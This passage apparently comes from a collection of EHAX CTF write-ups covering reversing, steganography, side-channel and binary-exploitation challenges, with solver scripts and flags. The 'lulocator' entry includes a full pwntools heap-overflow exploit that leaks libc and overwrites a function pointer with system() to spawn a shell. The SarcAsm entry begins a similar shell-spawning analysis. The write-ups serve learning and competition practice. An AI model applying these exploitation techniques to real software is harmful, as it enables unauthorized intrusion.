scramble(keystream, 16, salt ^ state ^ 0x3c6ef372)

# Fold keystream back into state
for i in range(16):
    state ^= keystream[i] << ((i & 3) * 8)

# Generate 32-byte target using xorshift PRNG
prng_state = state
target = bytearray(32)
for i in range(32):
    prng_state = xorshift(prng_state)  # shift 13, 17, 5
    target[i] = data_at_0x21a5[i] ^ (prng_state & 0xFF)
\`\`\`

### 4. Compute the Answer

Running the derivation produces:
\`\`\`
target = ghost_8d3f4a91c2e7b6d0
\`\`\`

### 5. Submit

\`\`\`
$ echo "ghost_8d3f4a91c2e7b6d0" | nc chall.ehax.in 22222
EH4X{fr3k7_fri3n5dly_1nt3rf4c35_0nc3_4g41n}
\`\`\`

## Flag

\`\`\`
EH4X{fr3k7_fri3n5dly_1nt3rf4c35_0nc3_4g41n}
\`\`\`

## Tools Used
- radare2 (r2) for disassembly
- GCC for C driver programs
- Python 3 for the solver script
- LD_PRELOAD interception for stage2 extraction
`},
  {slug:'iguessbro',title:'I Guess Bro',cat:'Rev',pts:null,solves:null,
   md:`# chall - "I Guess Bro" Hard Mode

## Challenge Type
Reverse Engineering - RISC-V 64-bit ELF binary (statically linked, stripped)

## Tools Used
- \`file\`, \`strings\` - initial recon
- \`radare2\` - disassembly and static analysis
- Python 3 - decryption and verification

## Analysis

### Initial Recon
\`\`\`
$ file chall
chall: ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI, version 1 (SYSV),
       statically linked, stripped
\`\`\`

The binary is a **RISC-V** executable, meaning it cannot run natively on x86_64. No QEMU was available, so pure static analysis was required.

### String Analysis
\`strings\` revealed:
- Two **fake flags**: \`EH4X{n0t_th3_r34l_fl4g}\` and \`EH4X{try_h4rd3r_buddy}\`
- Prompts: "Can you guess the flag?", "Enter the flag:"
- Validation messages: "Wrong length!", "Correct! You guessed it!", "Wrong!"
- The expected input length is **35 characters** (checked via \`li a5, 35\` / \`bne\`)

### Main Function (0x1037e)
1. Prints banner and reads input (max 128 bytes via \`fgets\`)
2. Strips newline
3. Checks input length == 35
4. Calls flag verification at \`0x10732\`

### Verification Function (0x10732)
This function performs **four checks**:

1. **Fake flag rejection** - Uses \`strcmp\` against both decoy flags. If input matches either, it rejects.
2. **Anti-timing check** - Runs a computational loop (sum of odd numbers to 99999) and measures execution time to detect debuggers.
3. **Three validation functions** called in sequence:

#### Check 1: XOR Decryption (0x105cc)
35 bytes of encrypted data are embedded in the binary at file offset \`0x47BC8\`. The decryption algorithm:
\`\`\`python
decrypted[i] = encrypted[i] ^ (7*i & 0xFF) ^ 0xA5
\`\`\`
The decrypted result is compared byte-by-byte against the user's input.

#### Check 2: Format + Checksum (0x10622)
- Verifies \`EH4X{...}\` wrapper (checks bytes at positions 0-4 and 34)
- Computes sum of all 35 ASCII byte values
- Verifies checksum == 3243

#### Check 3: Custom Hash (0x10700)
- Calls \`compute_hash(input, 35)\` which uses a xoshiro-style mixing function
- Initial seed: \`0xDEADBEEF\`
- Each byte is shifted by \`(i % 8) * 8\` bits, XOR'd into state
- State is mixed via: \`rotate_left_13(state ^ (constant >> i)) ^ 0xebfa848108987eb0\`
- Final hash must equal \`0x81cf06f4a08cb5ef\`

### Decryption
Extracting the 35 encrypted bytes from the binary and applying the XOR decryption:

\`\`\`python
with open('chall', 'rb') as f:
    f.seek(0x47BC8)
    encrypted = f.read(35)

decrypted = bytearray(35)
counter = 0
for i in range(35):
    decrypted[i] = (encrypted[i] ^ (counter & 0xFF) ^ 0xA5) & 0xFF
    counter += 7

print(decrypted.decode())  # EH4X{y0u_gu3ss3d_th4t_r1sc_cr4ckm3}
\`\`\`

## Flag
\`\`\`
EH4X{y0u_gu3ss3d_th4t_r1sc_cr4ckm3}
\`\`\`
`},
  {slug:'jpeg-soul',title:'JPEG SOUL',cat:'Forensics',pts:null,solves:null,
   md:`# JPEG SOUL - CTF Steganography Challenge Writeup

## Challenge Information
- **Challenge Name:** JPEG SOUL
- **Category:** Steganography
- **Author:** tanish_fr
- **Flag Format:** EHAX{}
- **Hint:** "My soul will guide you, even through what seems insignificant"
- **File:** jpeg-soul.jpg (733x859 JPEG, 286KB)

## Flag

\`\`\`
EHAX{jp3g_s3crt}
\`\`\`

("jpeg secret" in leetspeak)

## Solution

### Initial Reconnaissance

The image is a reproduction of a Raja Ravi Varma painting ("Woman Holding a Fruit"). Standard steg tools (binwalk, strings, EXIF analysis, steghide/stegseek, jsteg) yielded no results. There was no data appended after the JPEG EOF marker, no hidden comments, and no embedded files.

### Key Observation: 4 Quantization Tables

Parsing the JPEG structure revealed an unusual feature: **4 quantization tables** (QT0, QT1, QT2, QT3) were defined, but only **2 were actually used** by the image components:

- Component 1 (Y/Luminance): uses QT0
- Component 2 (Cb): uses QT1
- Component 3 (Cr): uses QT1

**QT2 and QT3 are defined but never referenced by any component.** This is the "soul" of the JPEG -- the quantization tables that define image quality.

### Decoding the Hint

The hint says: "My **soul** will guide you, even through what seems **insignificant**"

- **Soul** = The quantization tables (the "soul" of a JPEG that determines its quality/character)
- **Insignificant** = Least Significant Bit (LSB)

### The Technique: LSB Steganography in Quantization Tables

The flag is hidden in the **least significant bits (LSBs)** of the quantization table values, read in **natural (row-major) order** (not zigzag order as stored in the file).

JPEG files store quantization tables in zigzag scan order. The tables must first be **converted to natural 8x8 matrix order** (row by row, left to right, top to bottom) using the standard JPEG zigzag mapping.

### Extraction Process

1. Parse all 4 DQT (Define Quantization Table) markers from the JPEG file
2. Extract the 64 values from each quantization table (stored in zigzag order)
3. Convert each table from zigzag order to natural (row-major) 8x8 order
4. Extract the LSB (bit 0) of each value from all 4 tables in sequence: QT0, QT1, QT2, QT3
5. Group the resulting 256 bits into bytes (MSB first)
6. Read the ASCII text

### Result

The 256 LSB bits (32 bytes) decode as:

| Byte Range | Source | Hex | ASCII |
|-----------|--------|-----|-------|
| 0-7 | QT0 | \`fff9036e2b850548\` | (non-printable) |
| 8-15 | QT1 | \`e014000000000000\` | (non-printable) |
| 16-23 | QT2 | \`454841587b6a7033\` | \`EHAX{jp3\` |
| 24-31 | QT3 | \`675f73336372747d\` | \`g_s3crt}\` |

The flag \`EHAX{jp3g_s3crt}\` is encoded entirely in the LSBs of **QT2 and QT3** (the two unused quantization tables). QT0 and QT1 (the tables actually used for image compression) contain non-flag data in their LSBs.

### Why Standard Tools Failed

- **jsteg/stegseek/steghide:** These tools look for data hidden in DCT coefficients, not in quantization table values
- **Pixel LSB extraction:** JPEG is lossy compression, so pixel-level LSBs are meaningless
- **binwalk:** Only looks for embedded file signatures, not steganographic data
- The technique is custom and exploits an unusual JPEG structural feature (unused quantization tables)

### Key Insight

The critical realization was that:
1. Having 4 quantization tables when only 2 are needed is suspicious
2. The unused tables (QT2 and QT3) closely resemble standard JPEG luminance and chrominance tables with subtle modifications
3. The LSBs of these table values, read in natural (not zigzag) order, encode ASCII text

### Verification Script

\`\`\`python
#!/usr/bin/env python3
import struct

zigzag_order = [
    0, 1, 8, 16, 9, 2, 3, 10, 17, 24, 32, 25, 18, 11, 4, 5,
    12, 19, 26, 33, 40, 48, 41, 34, 27, 20, 13, 6, 7, 14, 21, 28,
    35, 42, 49, 56, 57, 50, 43, 36, 29, 22, 15, 23, 30, 37, 44, 51,
    58, 59, 52, 45, 38, 31, 39, 46, 53, 60, 61, 54, 47, 55, 62, 63
]

with open('jpeg-soul.jpg', 'rb') as f:
    data = f.read()

# Parse all QT tables
qt_tables = {}
i = 0
while i < len(data) - 1:
    if data[i] == 0xFF and data[i+1] == 0xDB:
        length = struct.unpack('>H', data[i+2:i+4])[0]
        seg = data[i+4:i+2+length]
        j = 0
        while j < len(seg):
            table_id = seg[j] & 0xF
            qt_tables[table_id] = list(seg[j+1:j+65])
            j += 65
        i += 2 + length
    elif data[i] == 0xFF and data[i+1] not in (0x00, 0xFF):
        if data[i+1] == 0xD8:
            i += 2
        elif i + 3 < len(data):
            i += 2 + struct.unpack('>H', data[i+2:i+4])[0]
        else:
            i += 1
    else:
        i += 1

# Convert zigzag to natural order and extract LSBs
all_lsbs = []
for table_id in range(4):
    zz = qt_tables[table_id]
    natural = [0] * 64
    for k in range(64):
        natural[zigzag_order[k]] = zz[k]
    all_lsbs.extend([v & 1 for v in natural])

# Convert to bytes
result = bytearray()
for k in range(0, len(all_lsbs), 8):
    byte = 0
    for j in range(8):
        byte = (byte << 1) | all_lsbs[k + j]
    result.append(byte)

# Extract flag
idx = result.find(b'EHAX{')
end = result.find(b'}', idx)
print(result[idx:end+1].decode())  # EHAX{jp3g_s3crt}
\`\`\`
`},
  {slug:'kaje',title:'Kaje',cat:'Rev',pts:467,solves:42,
   md:`# Kaje - EHAX CTF (Reverse Engineering, 467pts)

## Challenge

- **Name:** Kaje
- **Category:** Reverse Engineering
- **Points:** 467
- **Solves:** 42
- **Author:** Anonimbus
- **Description:** "I don't know what is the intended solution anymore."

## Solution

### Binary Overview

The challenge provides a 64-bit ELF binary (\`kaje\`), not stripped, compiled from \`final.c\`. It contains three key functions: \`main\`, \`gen_entropy\`, and \`gen_keystream\`.

### Analysis

#### gen_entropy (0x1290)

This function determines a seed value based on the runtime environment:

1. **Docker detection:** Checks if \`/.dockerenv\` exists using \`access()\`.
   - If the file **exists** (we are in Docker): \`r12 = 0xcd9aadd8d9c9a989\`
   - If the file **does not exist** (not in Docker): \`r12 = 0x1337133713371337\`

2. **Overlay filesystem detection:** Opens \`/proc/self/mountinfo\` and searches each line for the string \`"overlay"\`.
   - If found: \`r12 ^= 0xabcdef1234567890\`

3. **Finalization:** Applies the murmur3 64-bit finalizer (mix64) to \`r12\` and returns it as the seed.

This creates four possible seed values depending on the environment.

#### gen_keystream (0x13b0)

Generates 32 bytes of keystream from the seed using a chained murmur3 hash:

\`\`\`
s = seed
for i in 0..31:
    v = s + i
    s = mix64(v)
    keystream[i] = s & 0xFF
\`\`\`

Where \`mix64\` is the standard murmur3 64-bit finalizer:
\`\`\`
x ^= x >> 33
x *= 0xff51afd7ed558ccd
x ^= x >> 33
x *= 0xc4ceb9fe1a85ec53
x ^= x >> 33
\`\`\`

#### main (0x1120)

1. Calls \`gen_entropy()\` to get the seed.
2. Calls \`gen_keystream(seed)\` to generate 32 bytes of keystream on the stack.
3. XORs the keystream with 32 bytes of encrypted data stored in \`.rodata\` (at offsets 0x2030 and 0x2040) using SSE \`pxor\` instructions.
4. Prints the result with \`puts()\`.

### Encrypted Data

From \`.rodata\`:
\`\`\`
0x2030: 9f 12 d9 1b e2 12 bb ba fb f5 fe e8 a6 32 ac c6
0x2040: 04 36 92 d4 c9 3b bd be 22 a2 b4 83 6b 45 03 d3
\`\`\`

### Solving

The challenge description hints at multiple approaches -- but fundamentally, there are only four possible seeds based on the two boolean checks (docker present, overlay present). By trying all four combinations:

| Environment | r12 | Decrypted Output |
|---|---|---|
| Docker + overlay | \`0x665742caed9fd119\` | \`EH4X{dUnn0_wh4tt_1z_1nt3NTenD3d}\` |
| Docker + no overlay | \`0xcd9aadd8d9c9a989\` | garbage |
| No docker + overlay | \`0xb8fafc2527616ba7\` | garbage |
| No docker + no overlay | \`0x1337133713371337\` | garbage |

The correct environment is **Docker with overlay filesystem** (the "intended" execution environment, matching how CTF challenges are typically deployed in containers).

## Flag

\`\`\`
EH4X{dUnn0_wh4tt_1z_1nt3NTenD3d}
\`\`\`

The flag text "dUnn0_wh4tt_1z_1nt3NTenD3d" (dunno what is intended) mirrors the challenge description "I don't know what is the intended solution anymore."
`},
  {slug:'let-the-penguin-live',title:'Let The Penguin Live',cat:'Forensics',pts:50,solves:171,
   md:`# Let-the-penguin-live

**Category:** Forensics
**Points:** 50
**Solves:** 171

## Challenge Description

> In a colony of many, one penguin's path is an anomaly. Silence the crowd to hear the individual.

## Solution

### 1. Initial Analysis

The challenge provides an MKV (Matroska) video file. Using \`ffprobe\`, we discover it contains **3 streams**:
- 1 H.264 video track
- **2 FLAC audio tracks** (both stereo, 44100Hz)

The container metadata includes a decoy flag: \`EH4X{k33p_try1ng}\` â€” literally telling us to keep trying.

### 2. Key Insight

The hint "silence the crowd to hear the individual" points to **subtracting one audio track from the other** to isolate a hidden signal. Having two nearly identical audio tracks is the "colony of many" â€” the anomaly is the tiny difference between them.

### 3. Audio Differencing

Extract both audio streams and compute the difference signal (audio stream 2 minus audio stream 1). Most of the audio cancels out, leaving only the hidden data.

### 4. Spectrogram Analysis

Computing the **spectrogram of the difference signal** reveals text written as bright pixels in the frequency domain, visible around the 50-54 second mark. The flag is rendered as spectrogram art across multiple frequency bands (~3-6kHz and ~14-18kHz).

### 5. Flag

Reading the spectrogram text:

\`\`\`
EH4X{0n3_tr4ck_m1nd_tw0_tr4ck_f1les}
\`\`\`

## Flag

\`EH4X{0n3_tr4ck_m1nd_tw0_tr4ck_f1les}\`
`},
  {slug:'lulocator',title:'lulocator',cat:'BinEx',pts:50,solves:186,
   md:`# lulocator - Binary Exploitation (50 pts, 186 solves)

## Challenge

> "Who needs that buggy malloc? Made my own completely safe lulocator."

We are given a stripped ELF 64-bit binary with a custom heap allocator backed by \`mmap\`, along with the challenge libc. The binary has No PIE, No RELRO, No Canary, and NX enabled.

## Binary Analysis

The program provides a menu with 7 operations:

1. **new** - Allocates an object with a custom allocator, stores pointer in a slots array (max 16 slots)
2. **write** - Reads data from stdin into an object's data buffer
3. **delete** - Frees an object and NULLs its slot
4. **info** - Prints the object's address, output stream pointer (stdout), and length
5. **set_runner** - Stores a slot's object pointer into a global \`runner\` variable
6. **run** - Calls \`runner->func_ptr(runner + 0x28)\` (function pointer stored at offset 0x10 of the object)
7. **quit** - Exits

### Object Layout (at address returned by allocator)

| Offset | Size | Field |
|--------|------|-------|
| +0x00 | 8 | field0 (unused, init to 0) |
| +0x08 | 8 | field1 (unused, init to 0) |
| +0x10 | 8 | func_ptr (initialized to a print function at 0x401608) |
| +0x18 | 8 | output stream (FILE* stdout) |
| +0x20 | 8 | length (user-requested size) |
| +0x28 | N | user data buffer |

### Custom Allocator

- Arena: 0x40000 bytes allocated via \`mmap(PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON)\`
- Bump allocation for new chunks, doubly-linked circular free list for freed chunks
- Chunk header: 8 bytes before the data area, stores \`aligned_size | in_use_bit\`
- Aligned size = \`align_up(request_size + 8, 16)\` with minimum 0x28
- Free list has integrity checks (corrupted free list detection, double-free detection)

## Vulnerability: Heap Buffer Overflow

The **write** command has a bounds check bug. It allows writing up to \`obj->length + 0x17\` (23 extra) bytes into the data buffer at \`obj + 0x28\`, but the actual allocated data area may be smaller than that, depending on alignment.

\`\`\`
// Pseudocode of the bounds check
if (user_len >= obj->length + 0x18)  // reject
    puts("too long");
\`\`\`

When the allocation size is perfectly aligned (e.g., \`size % 16 == 0\`), there is zero padding, and the full 23 bytes overflow into the adjacent chunk. This overflow covers:
- 8 bytes of the next chunk's **size header**
- 15 bytes of the next chunk's object fields (offsets 0x00 through 0x0E)

## Exploitation Strategy

The key insight is that by corrupting an adjacent chunk's size header, we can create **overlapping allocations** when the chunk is freed and reallocated.

### Step-by-Step

1. **Allocate three adjacent chunks** A (slot 0), B (slot 1), C (slot 2), each with size 0x10

2. **Leak libc** via \`info(0)\` - the \`out\` field at obj+0x18 contains a pointer to \`stdout\` (a libc address: \`_IO_2_1_stdout_\`). Compute \`libc_base\` and \`system()\` address.

3. **Set runner to C** via \`set_runner(2)\` - the global runner variable now holds C's address

4. **Write "/bin/sh\\0" to C** - this goes to C+0x28, which \`run()\` will later pass as the argument to the function pointer

5. **Overflow from A into B's chunk header** - write 16 bytes of padding + \`p64(0x101)\` to change B's apparent chunk size from 0x40 to 0x100 (with in_use bit set)

6. **Free B** - the allocator now believes B is a 0x100-byte free chunk, much larger than its actual 0x40 bytes

7. **Allocate D (size 0x20)** - the allocator finds B's "large" free chunk and allocates from it. The allocation takes the first 0x50 bytes, and the allocator **splits** the remainder (0xB0 bytes) into a new free chunk starting at C+0x08. This remainder overlaps with C's object fields.

8. **Write through D** to overflow into C's memory. D's user data starts at offset 0x28 from D. C's function pointer (C+0x10) is exactly 40 bytes from D's user data start. We write: 32 bytes of D's data + 8 bytes padding + 8 bytes of \`system()\` address. This overwrites C+0x10 (the func_ptr) with \`system\`.

9. **Call run()** - this executes \`runner->func_ptr(runner + 0x28)\` which is now \`system("/bin/sh")\`, giving us a shell.

### Memory Layout Diagram

\`\`\`
Before corruption:
[A header][A object (0x38 bytes)][B header][B object (0x38 bytes)][C header][C object]
 base+0   base+8                  base+0x40 base+0x48              base+0x80 base+0x88

After step 5 (overflow from A):
[A header][A data... AAAA...][0x101     ][B object               ][C header][C object]
                              ^corrupted B header (was 0x41)

After step 7 (alloc D from "big" B):
[A chunk  ][D header][D object (0x48 bytes)   ][remainder hdr][remainder...]
                                                ^base+0x90 = C+0x08
                                                          ^C+0x10 = func_ptr (in remainder)

After step 8 (write through D):
D's write data:  [DDDDD...32 bytes...][00000000][system_addr]
Lands at:        D+0x28               C+0x08    C+0x10 (func_ptr!)
\`\`\`

## Exploit Code

\`\`\`python
from pwn import *

p = remote('chall.ehax.in', 40137)
libc = ELF('./libc.so.6', checksec=False)

# Helper functions for menu interaction
def new(sz):
    p.sendlineafter(b'> ', b'1'); p.sendlineafter(b'size: ', str(sz).encode()); return p.recvline()
def write_data(idx, data):
    p.sendlineafter(b'> ', b'2'); p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'len: ', str(len(data)).encode()); p.sendafter(b'data: ', data); return p.recvline()
def delete(idx):
    p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'idx: ', str(idx).encode()); return p.recvline()
def info(idx):
    p.sendlineafter(b'> ', b'4'); p.sendlineafter(b'idx: ', str(idx).encode()); return p.recvline()
def set_runner(idx):
    p.sendlineafter(b'> ', b'5'); p.sendlineafter(b'idx: ', str(idx).encode()); return p.recvline()

new(0x10); new(0x10); new(0x10)                             # A=slot0, B=slot1, C=slot2
stdout_addr = int(info(0).split(b'out=')[1].split(b' ')[0], 16)
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
system_addr = libc_base + libc.symbols['system']

set_runner(2)                                                # runner -> C
write_data(2, b'/bin/sh\\x00')                                # C+0x28 = "/bin/sh"
write_data(0, b'A'*0x10 + p64(0x101))                       # corrupt B header: size=0x100
delete(1)                                                     # free "big" B
new(0x20)                                                     # D=slot1, overlaps C
write_data(1, b'D'*0x20 + p64(0) + p64(system_addr))        # overwrite C+0x10 = system
p.sendlineafter(b'> ', b'6')                                 # run() -> system("/bin/sh")
p.interactive()
\`\`\`

## Flag

\`\`\`
EH4X{unf0rtun4t3ly_th3_lul_1s_0n_m3}
\`\`\`
`},
  {slug:'pathfinder',title:'pathfinder',cat:'Rev',pts:null,solves:null,
   md:`# pathfinder - "Are you a pathfinder?"

## Challenge Type
Reverse Engineering - x86-64 ELF binary (dynamically linked, stripped)

## Tools Used
- \`file\`, \`strings\` - initial recon
- \`radare2\` - disassembly and static analysis
- Python 3 - maze decoding, BFS pathfinding, hash verification

## Analysis

### Initial Recon
\`\`\`
$ file pathfinder
pathfinder: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
            interpreter /lib64/ld-linux-x86-64.so.2, stripped
\`\`\`

Running the binary:
\`\`\`
$ ./pathfinder
Are you a pathfinder?
[y/n]: y
Ok, tell me the best path: test
Better luck next time.
\`\`\`

### Program Flow (main @ 0x16d0)
1. Asks "Are you a pathfinder?" and reads y/n
2. If 'y', prompts for a path (up to 64 bytes)
3. Calls \`validate_path(input)\` at \`0x1444\`
4. If valid, calls \`generate_flag(input, buf)\` at \`0x1602\` and prints the flag
5. Otherwise prints "Better luck next time."

### Maze Initialization

The maze is a **10x10 grid** stored at address \`0x40a0\`, initialized before \`main\` runs by constructor function \`init1\` at \`0x11ee\`.

Each cell is XOR-decrypted from encoded data at \`0x2020\`:
\`\`\`python
def key(i):
    return (((i << 5) - i + 0x11) ^ (i << 3) ^ 0xFFFFFFa5) & 0xFF

maze[i] = encoded[i] ^ key(i)
\`\`\`

Cell values are **direction bitmasks**:
- Bit 0 (0x01): South-related passage
- Bit 1 (0x02): East-related passage
- Bit 2 (0x04): North-related passage
- Bit 3 (0x08): West-related passage

### Direction Table (init2 @ 0x12ce)

Four valid direction characters are initialized in a lookup table at \`0x4120\`:

| Char | dx  | dy  | Valid |
|------|-----|-----|-------|
| N    | -1  |  0  | Yes   |
| S    | +1  |  0  | Yes   |
| E    |  0  | +1  | Yes   |
| W    |  0  | -1  | Yes   |
| n,s,e,w | various | various | **No** (traps) |

Lowercase directions are traps â€” their "valid" byte is set to 0, causing immediate failure.

### Path Validation (0x1444)

For each character in the path:
1. Look up direction entry (dx, dy, flags) from table
2. Compute XOR-based direction masks from character and flags
3. Calculate new position: \`(row + dx, col + dy)\`
4. Bounds check: both coordinates must be 0-9
5. Validate move using: \`(maze[current] & d4) | (maze[target] & d5) != 0\`
6. Update position

After processing all characters:
- Final position must be **(9, 9)**
- A custom hash of the path string must equal **0x86ba520c**

### Hash Function (0x126b)

Modified MurmurHash-style:
\`\`\`python
h = 0xDEADBEEF
for c in path:
    h ^= ord(c)
    h = rotate_left(h, 13)
    h = (h * 0x045d9f3b) & 0xFFFFFFFF
h ^= (h >> 16)
h = (h * 0x85ebca6b) & 0xFFFFFFFF
h ^= (h >> 13)
\`\`\`

### Decoded Maze

\`\`\`
Row 0:   8  10  12   .   .   .   .   .   .   .
Row 1:   .   .   5   .   .   8  10  10  12   .
Row 2:   .   .   3   .   .   5   .   .   5   .
Row 3:   8  10  10  10  10   1   .   .   5   .
Row 4:   5   .   .   .   .   .   8  10   1   .
Row 5:   5   .  12  10  12   .   5   .   .   .
Row 6:   5   .   5   .   5   .   5   .   .   .
Row 7:   5   .   1   .   3  10   9   .   8  12
Row 8:   5   .   .   .   .   .   .   .   5   5
Row 9:   3  10  10  10  10  10  10  10   1   3

Visual (# = wall, . = passable):
  ..........
  ##.##....#
  ##.##.##.#
  ......##.#
  .#####...#
  .#...#.###
  .#.#.#.###
  .#.#...#..
  .#######..
  ..........
\`\`\`

### Solving

BFS from (0,0) to (9,9) respecting the directional bitmask rules finds the unique valid path:

\`\`\`
EESSSWWSSSSSSEEEEEEEENNESS
\`\`\`

This path's hash matches the target \`0x86ba520c\`.

### Flag Generation (0x1602)

The flag function applies **Run-Length Encoding (RLE)** to the path:
- \`EE\` â†’ \`2E\`, \`SSS\` â†’ \`3S\`, \`WW\` â†’ \`2W\`, \`SSSSSS\` â†’ \`6S\`
- \`EEEEEEEE\` â†’ \`8E\`, \`NN\` â†’ \`2N\`, \`E\` â†’ \`E\`, \`SS\` â†’ \`2S\`

Wrapped in \`EHAX{...}\` giving: \`EHAX{2E3S2W6S8E2NE2S}\`

## Flag
\`\`\`
EHAX{2E3S2W6S8E2NE2S}
\`\`\`

*Note: The binary uses \`EHAX{...}\` prefix rather than the standard \`EH4X{...}\` format.*
`},
  {slug:'power-leak',title:'Power Leak',cat:'Forensics',pts:50,solves:null,
   md:`# Power Leak - Forensics (50 pts)

## Challenge

- **Name:** power leak
- **Category:** Forensics
- **Points:** 50
- **Author:** tanishfr
- **Description:** "Power reveals the secret. EHAX{SHA256(secret)}"

## Analysis

The challenge provides a CSV file (\`power_traces.csv\`) containing simulated power consumption traces, structured with columns: \`position\`, \`guess\`, \`trace_num\`, \`sample\`, \`power_mW\`.

### Data Structure

- **6 positions** (0-5): representing 6 digits of a secret
- **10 guesses** (0-9): candidate values for each digit
- **20 traces** per (position, guess) pair
- **50 samples** per trace: power measurements over time

This is a classic **Differential Power Analysis (DPA)** / side-channel attack scenario. The idea is that when the device processes the correct key guess, it leaks more power than for incorrect guesses.

### Methodology

Multiple analysis methods were applied:

1. **Peak Power Method (most reliable):** For each (position, guess), compute the average peak power across all 20 traces. The correct guess consistently shows the highest average peak.

2. **Standard Deviation Method:** The correct guess produces traces with higher variance (larger standard deviation) due to the data-dependent power spike.

3. **Overall Average Power:** Simple average of all power samples per (position, guess) also pointed to the correct answer, though with smaller margins.

### Results per Position

| Position | Winning Guess | Avg Peak Power (mW) | Runner-up | Margin (mW) |
|----------|--------------|---------------------|-----------|-------------|
| 0        | 7            | 82.23               | 4 (79.40) | 2.83        |
| 1        | 9            | 82.06               | 7 (79.20) | 2.86        |
| 2        | 2            | 80.74               | 6 (78.95) | 1.79        |
| 3        | 9            | 80.81               | 2 (79.50) | 1.32        |
| 4        | 6            | 81.07               | 4 (78.82) | 2.25        |
| 5        | 3            | 81.44               | 5 (79.35) | 2.08        |

All positions show clear separation between the correct guess and the runner-up.

### Secret Recovery

The recovered secret is: **792963**

### Flag Computation

\`\`\`
SHA256("792963") = 5bec84ad039e23fcd51d331e662e27be15542ca83fd8ef4d6c5e5a8ad614a54d
\`\`\`

## Flag

\`\`\`
EHAX{5bec84ad039e23fcd51d331e662e27be15542ca83fd8ef4d6c5e5a8ad614a54d}
\`\`\`

## Key Takeaways

- Power analysis attacks exploit the fact that a device's power consumption correlates with the data being processed
- Even with noise, statistical methods (averaging across multiple traces) can reliably extract the secret
- The peak power per trace was the most discriminating feature in this dataset
`},
  {slug:'quantum-message',title:'Quantum Message',cat:'Forensics',pts:359,solves:null,
   md:`# Quantum Message (359 points) - Forensics/Audio Steganography

## Challenge Description

> "my quantum physics professor was teaching us about 1-D harmonic oscillator, he gave me a problem in which the angular frequency was 57 1035 (weird number) and it asked to calculate the energy eigenvalues, then he called someone, who did he call?"

## Flag

\`\`\`
EH4X{qu4ntum_phys1c5_15_50_5c4ry}
\`\`\`

(Leetspeak for "quantum physics is so scary")

## Solution

### 1. File Analysis

The challenge file is a 14MB WAV file: mono, 44100 Hz sample rate, IEEE 32-bit float, 81.6 seconds duration.

### 2. Frequency Analysis

Spectral analysis revealed the audio contains only 7 distinct frequencies, all concentrated below 4000 Hz:

| Frequency (Hz) | Index | Harmonic (2n+1) |
|----------------|-------|------------------|
| 301            | 0     | 1                |
| 902            | 1     | 3                |
| 1503           | 2     | 5                |
| 2104           | 3     | 7                |
| 2705           | 4     | 9                |
| 3306           | 5     | 11               |
| 3907           | 6     | 13               |

These are the **odd harmonics** of ~301 Hz: \`301 * (2n+1)\` for \`n=0..6\`.

This directly relates to the **quantum harmonic oscillator** hint. The energy eigenvalues of a 1D harmonic oscillator are \`E_n = hbar * omega * (n + 1/2)\`, which are equally spaced at odd half-integer multiples of the base energy.

### 3. Tone Structure

Each time segment contains exactly **two** simultaneously active frequencies. The audio always pairs one "low" frequency (indices 0-3) with one "high" frequency (indices 4-6), creating a 4x3 grid identical to a **phone keypad** (DTMF-like encoding):

\`\`\`
            f4(2705)  f5(3306)  f6(3907)
f0(301):      1         2         3
f1(902):      4         5         6
f2(1503):     7         8         9
f3(2104):     *         0         #
\`\`\`

### 4. Duration Encoding

Each tone has a duration of 1, 2, or 3 seconds. The duration indicates how many times the digit **repeats**. For example:
- Tone (2,5) for 2 seconds = digit "8" repeated twice = "88"
- Tone (2,6) for 3 seconds = digit "9" repeated thrice = "999"

### 5. Decoding

After expanding all 63 tone groups with their durations, the full digit string is:

\`\`\`
69725288123113117521101161171099511210412111549995395495395534895539952114121125
\`\`\`

This string represents variable-length **ASCII decimal codes** (2 or 3 digits per character):

\`\`\`
69  72  52  88  123  113  117  52  110  116  117  109  95  112  104  121
E   H   4   X   {    q    u    4   n    t    u    m    _   p    h    y

115  49  99  53  95  49  53  95  53  48  95  53  99  52  114  121  125
s    1   c   5   _   1   5   _   5   0   _   5   c   4   r    y    }
\`\`\`

The decoding is **unambiguous** - dynamic programming confirms there is exactly one valid ASCII interpretation of the digit string.

### Tools Used

- Python 3 with scipy, numpy for WAV parsing and FFT analysis
- scipy.signal.find_peaks for frequency peak detection
- Dynamic programming for unambiguous variable-length ASCII decoding
`},
  {slug:'sarcasm',title:'SarcAsm',cat:'BinEx',pts:157,solves:null,
   md:`# SarcAsm - EHAX CTF (Binary Exploitation, 157pts)

## Challenge

The challenge provides a custom VM binary (\`sarcasm\`) that implements a stack-based virtual machine called "SarcAsm". The VM supports assembling text mnemonics into bytecode (\`--asm\` mode) and executing bytecode. The goal is to spawn a shell on the remote server at \`chall.ehax.in:9999\`.

## Analysis

### Binary Overview

- ELF 64-bit PIE stripped binary
- Implements a stack-based VM with custom opcodes
- Contains an \`execve("/bin/sh")\` wrapper function at offset \`0x3000\` in the binary
- The wrapper is referenced by a pointer stored in \`.data\` at \`0xa010\`

### VM Architecture

The VM uses a tagged value system:
- **Odd values**: Tagged integers (actual value = val >> 1)
- **Even values**: Pointers to heap objects

Heap objects have a type field at offset 0:
- **Type 1**: Buffer (raw byte storage)
- **Type 2**: Slice (view into a buffer, shares the data pointer)
- **Type 3**: Builtin/native function (contains a function pointer)

All three types share the same layout with a data pointer at offset \`0x18\`. For buffers, user data begins at \`data+8\`. For builtins, the function pointer is stored at \`data+8\`.

### Key Opcodes

| Opcode | Mnemonic | Description |
|--------|----------|-------------|
| 0x01   | PUSH     | Push immediate value |
| 0x02   | DUP      | Duplicate top of stack |
| 0x04   | DROP     | Remove top of stack |
| 0x20   | NEWBUF   | Create buffer with given capacity |
| 0x21   | READ     | Read bytes from stdin into buffer |
| 0x22   | SLICE    | Create a slice view of a buffer |
| 0x23   | PRINTB   | Print buffer/slice contents to stdout |
| 0x25   | WRITEBUF | Write bytes from stdin into buffer at offset |
| 0x30   | GLOAD    | Load from global variable |
| 0x31   | GSTORE   | Store to global variable |
| 0x40   | BUILTIN  | Create a builtin function object (index 0 or 1 only) |
| 0x41   | CALL     | Call a function object |
| 0x60   | GC       | Trigger garbage collection |
| 0xFF   | HALT     | Stop execution |

### Builtin Table

Located at \`0x9a60\` in \`.data.rel.ro\`, each entry is 16 bytes (func_ptr, num_args):
